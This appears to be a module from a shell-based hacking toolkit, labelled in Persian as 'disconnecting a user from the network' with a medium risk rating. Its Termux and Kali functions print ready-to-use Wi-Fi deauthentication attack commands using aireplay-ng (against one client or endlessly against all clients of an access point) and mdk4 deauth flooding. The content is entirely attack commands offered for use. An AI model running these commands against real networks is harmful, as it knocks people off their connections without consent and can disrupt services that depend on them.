DESC="قطع کردن کاربر از شبکه"
RISK="MED"

termux(){ echo "su -c 'aireplay-ng --deauth 0 -a <BSSID> wlan0'"; }

kali(){
cat <<'EOF'
# یک کلاینت:
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
# همه، بی‌پایان:
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
# با mdk4 (قوی‌تر):
sudo mdk4 wlan0mon d -c <CHANNEL>
EOF
}
